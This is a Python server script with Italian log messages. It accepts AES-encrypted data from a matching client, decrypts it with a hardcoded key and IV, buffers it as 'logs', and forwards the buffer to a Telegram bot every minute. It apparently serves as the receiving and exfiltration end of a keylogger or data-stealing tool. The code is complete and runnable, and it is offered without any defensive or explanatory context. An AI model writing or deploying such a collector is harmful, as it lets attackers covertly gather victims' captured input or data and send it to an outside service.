# NECESSARY
# pip install pycryptodome python-telegram-bot
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import time
from telegram import Bot

AES_KEY = b"AfterLifeDeath00"  # 16 bytes, must match client
AES_IV = b"AfterDeathLife00"  # 16 bytes, must match client

# === TELEGRAM CONFIG ===
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
bot = Bot(token=TELEGRAM_TOKEN)
log_buffer = []

def decrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    try:
        decrypted = unpad(cipher.decrypt(data), AES.block_size)
        return decrypted.decode(errors='ignore')
    except Exception as e:
        return f"[DECRYPT ERROR] {e}\n"

HOST = '127.0.0.1'
PORT = 5000

def send_buffer_periodically():
    while True:
        time.sleep(60)
        if log_buffer:
            try:
                message = ''.join(log_buffer)
                bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message or "[Empty]")
                log_buffer.clear()
            except Exception as e:
                print(f"[TELEGRAM ERROR] {e}")

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((HOST, PORT))
                s.listen(1)
                print(f"Server in ascolto su {HOST}:{PORT}")

                while True:
                    print("In attesa di una connessione...")
                    conn, addr = s.accept()
                    with conn:
                        print(f"Connessione accettata da {addr}")
                        while True:
                            data = conn.recv(1024)
                            if not data:
                                print(f"Connessione chiusa da {addr}")
                                break
                            # Decrypt and print
                            decrypted = decrypt_data(data)
                            print(decrypted, end='', flush=True)
                            log_buffer.append(decrypted)
        except Exception as e:
            print(f"\n[ERRORE SERVER] {e}. Riavvio tra 2 secondi...")
            time.sleep(2)

if __name__ == "__main__":
    threading.Thread(target=send_buffer_periodically, daemon=True).start()
    main()
